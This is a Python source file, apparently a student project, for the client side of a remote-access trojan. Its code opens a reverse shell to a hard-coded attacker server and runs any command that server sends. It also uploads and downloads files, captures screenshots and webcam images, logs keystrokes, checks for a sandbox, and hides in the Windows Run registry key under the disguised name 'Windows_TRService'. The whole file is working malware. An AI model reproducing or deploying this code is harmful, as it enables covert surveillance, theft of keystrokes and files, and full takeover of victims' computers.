#!/usr/bin/python3
#_*_ coding: utf8 _*_

"""
    Made by:
        - Camilo Laiton

        University of Magdalena, Colombia
        2020-1
        GitHub: https://github.com/camilolaiton/
"""

# pyinstaller client.py --onefile --noconsole --icon resources/iconf.....ico

import socket
import os, sys, struct, shutil, time, base64, subprocess, platform, ctypes, threading
import requests, mss, pynput
import pygame, pygame.camera

USER = 'trex'
PASSWORD = 'trex'

class Client():

    def __init__(self, ip_addrs, up_port):
        self.ip_addrs = ip_addrs
        self.up_port = up_port
        self.__client = None
        self.connected = False
        self.__PROGRAM_NAME = 'Windows_TRService'

        self.__CODIFICATOR = 'utf-8'
        self.__OS = None
        self.__get_system_info()
        
        self.__camera = None
        self.__load_camera()

        self.__strKeyLogs = ""
        self.__intKeyLogs = 0
        self.__KeyListener = None
        self.__Key = None
        self.__load_keyboard()

        self.__encode_text_data = lambda text_data: base64.b64encode(text_data.encode(self.__CODIFICATOR))
        self.__decode_text_data = lambda text_data: base64.b64decode(text_data).decode(self.__CODIFICATOR)

        self.__encode_byte_data = lambda byte_data : base64.b64encode(byte_data)
        self.__decode_byte_data = lambda byte_data : base64.b64decode(byte_data)

    def connectClient(self):
        self.__client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__client.connect((self.ip_addrs, self.up_port))
        self.connected = True

    def auth(self):
        try:
            
            info = self.__decode_text_data(self.__recv_msg())
            
            if (info == USER+PASSWORD):
                self.__send_to_server(self.__encode_text_data("LOGGED"))
                self.connected = True
            else:
                self.connected = False
                self.__send_to_server(self.__encode_text_data("Invalid username or password!"))

        except socket.error:
            self.closeClient()

        return self.connected

    def closeClient(self):
        self.__client.close()
        self.connected = False

    def __load_camera(self):
        if (self.__OS != "windows"):
            try:
                pygame.init()
                pygame.camera.init()
                camlist = pygame.camera.list_cameras()
                self.__camera = pygame.camera.Camera(camlist[0], (640,480))

            except pygame.error as err:
                # print("[+] There's an error loading the camera: ", err)
                pass
        else:
            # print("[+] Camera module not working for Windows")
            pass

    def __load_keyboard(self):
        self.__KeyListener = pynput.keyboard.Listener(on_press=self.__OnKeyboardEvent)
        self.__Key = pynput.keyboard.Key

    def __send_to_server(self, msg):
        try:
            # print("TAMAÑO MSG ENVIAR: ", len(msg))
            # print("MSG: ", msg)
            msg = struct.pack('>I', len(msg)) + msg
            self.__client.send(msg)
        except socket.error:
            return False
        return True

    def __recv_bytes(self, nbytes):
        data = b''

        while (len(data) < nbytes):
            packet = self.__client.recv(nbytes - len(data))

            if not (packet):
                return None
            
            data += packet

        return data

    def __recv_msg(self):
        msg_length = self.__recv_bytes(4)
        
        if not (msg_length):
            return None
        
        msg_length = struct.unpack('>I', msg_length)[0]
        # print("LEN: ", msg_length)
        return ( self.__recv_bytes(msg_length) )

    def __get_system_info(self):
        system_info = platform.system().lower()

        if ("linux" in system_info):
            self.__OS = "linux"
        elif ("windows" in system_info):
            self.__OS = "windows"
        else:
            self.__OS = "mac"

    def __download_file(self, path):
        if (os.path.exists(path)):
            try:
                with open(path, 'rb') as file_download:
                    self.__send_to_server(self.__encode_byte_data(file_download.read()))
            
            except:
                self.__send_to_server(self.__encode_text_data("error"))
        else:
            self.__send_to_server(self.__encode_text_data("false"))

    def __upload_file(self, path):
        with open(path, 'wb') as file:
            data = self.__decode_byte_data(self.__recv_msg())
            file.write(data)

    def __download_online_file(self, url):
        try:
            consult = requests.get(url)
            filename = url.split("/")[-1]

            with open(filename, 'wb') as file:
                file.write(consult.content)

            self.__send_to_server(self.__encode_text_data("File downloaded!"))
        except:
            self.__send_to_server(self.__encode_text_data("An error courred when downloading file!"))

    def __send_image_to_server(self, filename):

        with open(filename, 'rb') as image:
            
            data = image.read()

            while (data):
                self.__send_to_server(self.__encode_byte_data(data))
                data = image.read()

            self.__send_to_server(self.__encode_text_data("eof"))
        
        os.remove(filename)

    def __take_screenshot(self):
        try:
            screen = mss.mss()
            screen.shot()
            
            self.__send_image_to_server('monitor-1.png')
            
        except:
            self.__send_to_server(self.__encode_text_data("failure"))

    def __take_picture(self):
        if (self.__camera):
            self.__camera.start()
            img = self.__camera.get_image()
            pygame.image.save(img, 'image.jpg')
            self.__camera.stop()
            self.__send_image_to_server('image.jpg')
        else:
            self.__send_to_server(self.__encode_text_data("failure"))

    def __start_process(self, process):
        try:
            subprocess.Popen(process, shell=True)
            self.__send_to_server(self.__encode_text_data("Program started!"))
        except:
            self.__send_to_server(self.__encode_text_data("An error ocurred when starting the program"))

    def __other_commands(self, res):
        proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()

        if len(result):
            self.__send_to_server(self.__encode_byte_data(result))
        else:
            self.__send_to_server(self.__encode_text_data("Instruction completed!"))

    def __send_user_info(self):
        userInfo = f"{socket.gethostname()}, {platform.system()} {platform.release()}"

        if (self.__detect_sandbox()):
            userInfo += " (Sandboxie) "

        userInfo += f", {os.environ['USERNAME']}"
        
        self.__send_to_server(self.__encode_text_data(userInfo))

    def __detect_sandbox(self):
        try:
            ctypes.windll.LoadLibrary("SbieDll.dll")
        except Exception:
            return False
        return True

    def __persistence(self, option):
        if (option == "-s"):
            self.__create_persistence()

        elif (option == "-x"):
            self.__delete_persistence()

        elif ("-c" in option):
            if (self.__persistence_is_installed()):
                self.__send_to_server(self.__encode_text_data("Persistence is installed!"))
            else:
                self.__send_to_server(self.__encode_text_data("Persistence is not installed!"))
        else:
            self.__send_to_server(self.__encode_text_data("Please introduce a valid option for persistence"))

    def __create_persistence(self):
        
        if (self.__OS == 'windows'):

            if not (self.__persistence_is_installed()):
                file = f"\\{self.__PROGRAM_NAME}.exe"
                path = os.environ['appdata'] + file

                if not (os.path.exists(path)):
                    shutil.copyfile(sys.executable, path)
                    subprocess.call("REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (self.__PROGRAM_NAME, path) , shell=True)

                    self.__send_to_server(self.__encode_text_data("Persistence created!"))            
            else:
                self.__send_to_server(self.__encode_text_data("Computer has already persistence!"))
        else:
            self.__send_to_server(self.__encode_text_data("This computer is not Windows"))

    def __persistence_is_installed(self):
        
        if (self.__OS == "windows"):
            result = os.popen("REG QUERY HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % (self.__PROGRAM_NAME))

            if (self.__PROGRAM_NAME in result.read()):
                return True
            
        return False
    
    def __delete_persistence(self):
        
        if (self.__OS == "windows"):
            if not (self.__persistence_is_installed()):
                try:
                    subprocess.Popen("REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % (self.__PROGRAM_NAME), shell=True)
                    return True
                except Exception as err:
                    print("ERR: ", err)
                    self.__send_to_server(self.__encode_text_data("There's an error deleting the persistence!"))
            else:
                self.__send_to_server(self.__encode_text_data("Persistence is not installed!"))

        else:
            self.__send_to_server(self.__encode_text_data("Persistence is just available for Windows systems"))
   
    def __lock_computer(self):
        if (self.__OS == "windows"):
            ctypes.windll.user32.LockWorkStation()
            self.__send_to_server(self.__encode_text_data("Locking computer..."))
            self.closeClient()
        else:
            self.__send_to_server(self.__encode_text_data("This computer is not Windows!"))

    def __shutdown_computer(self, shutdown_type):

        if (self.__OS == "windows"):
            command = f"shutdown {shutdown_type} -t 5"
            proc = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            
            result = proc.stdout.read() + proc.stderr.read()
            
            if len(result):
                self.__send_to_server(self.__encode_byte_data(result))
            else:
                if ("-s" == shutdown_type):
                    self.__send_to_server(self.__encode_text_data("Computer shuttig down..."))
                else:
                    self.__send_to_server(self.__encode_text_data("Computer restart down..."))

            self.closeClient()  # close connection and exit
            sys.exit(0)
        
        else:
            self.__send_to_server(self.__encode_text_data("This computer is not Windows!"))

    def __test(self):
        self.__send_to_server(self.__encode_text_data("Client connected!"))

    def __OnKeyboardEvent(self, event):
        
        self.__intKeyLogs += 1

        if event == self.__Key.backspace:
            self.__strKeyLogs += "[Bck]"
        elif event == self.__Key.tab:
            self.__strKeyLogs += "[Tab]"
        elif event == self.__Key.enter:
            self.__strKeyLogs += "\n"
        elif event == self.__Key.space:
            self.__strKeyLogs += " "
        elif type(event) == self.__Key:
            self.__strKeyLogs += "[" + str(event)[4:] + "]"
        else:
            self.__strKeyLogs += str(event)[1:len(str(event)) - 1]  # Removing ""

    def __keylogger(self, option):

        if (option == "-s"):
            if not (self.__KeyListener.running):
                self.__KeyListener.start()
                self.__send_to_server(self.__encode_text_data("Launching KeyRex..."))
            else:
                self.__send_to_server(self.__encode_text_data("KeyRex is already running!"))

        elif (option == "-x"):
            if (self.__KeyListener.running):
                self.__KeyListener.stop()
                threading.Thread.__init__(self.__KeyListener)  # re-initialise the thread
                self.__strKeyLogs = ""
                self.__send_to_server(self.__encode_text_data("Stopping KeyRex..."))
            else:
                self.__send_to_server(self.__encode_text_data("KeyRex is not active!"))

        elif ("-d" in option):
            if not (self.__KeyListener.running):
                self.__send_to_server(self.__encode_text_data("false"))
                self.__send_to_server(self.__encode_text_data("KeyRex is not running!"))
            else:
                if (self.__strKeyLogs) == "":
                    self.__send_to_server(self.__encode_text_data("false"))
                    self.__send_to_server(self.__encode_text_data("KeyRex couldn't get typed keys!"))
                else:
                    self.__send_to_server(self.__encode_text_data("true"))
                    time.sleep(0.2)
                    self.__send_to_server(self.__encode_text_data(str(self.__intKeyLogs)))
                    time.sleep(0.2)
                    self.__send_to_server(self.__encode_text_data(self.__strKeyLogs))
                    self.__strKeyLogs = ""  # clear logs
                    self.__intKeyLogs = 0
        else:
            self.__send_to_server(self.__encode_text_data("Please introduce a valid option for TRex!"))

    def receiving_shell(self):
        
        current_dir = os.getcwd()
        self.__send_to_server(self.__encode_text_data(current_dir))

        while (True):
            res = self.__decode_text_data(self.__recv_msg())

            if (res == "--exit"):
                break
            elif (res[:2] == "cd") and (len(res) > 2):
                os.chdir(res[3:])
                result = os.getcwd()
                self.__send_to_server(self.__encode_text_data(result))

            elif (res[:10] == "--download"):
                self.__download_file(res[11:])

            elif (res[:8] == "--upload"):
                self.__upload_file(res[9:])

            elif (res[:5] == "--get"):
                self.__download_online_file(res[6:])

            elif (res[:8] == "--screen"):
                self.__take_screenshot()
            
            elif (res[:8] == "--camera"):
                self.__take_picture()

            elif (res[:5] == "--run"):
                self.__start_process(res[6:])
            
            elif (res[:10] == "--userinfo"):
                self.__send_user_info()
            
            elif (res[:6] == "--test"):
                self.__test()

            elif (res[:6] == "--lock"):
                self.__lock_computer()
            
            elif (res[:10] == "--shutdown"):
                self.__shutdown_computer("-s")
            
            elif (res[:9] == "--restart"):
                self.__shutdown_computer("-r")
            
            elif (res[:13] == "--persistence"):
                self.__persistence(res[14:])

            elif (res[:8] == "--keyrex"):
                self.__keylogger(res[9:])

            else:
                self.__other_commands(res)

def main():
    # IP_ADDRS = '0.tcp.ngrok.io'
    # UP_PORT = 15434
    # WAIT_TIME = 5
    
    IP_ADDRS = '192.168.0.4'
    UP_PORT = 7777
    WAIT_TIME = 5

    client1 = Client(IP_ADDRS, UP_PORT)

    while (True):

        try:
            client1.connectClient()
            if( client1.auth() ):
                client1.receiving_shell()
        except:
            client1.connected = False
            print("[+] Waiting for server...")
            time.sleep(WAIT_TIME)

    client1.closeClient()

if __name__ == "__main__":
    main()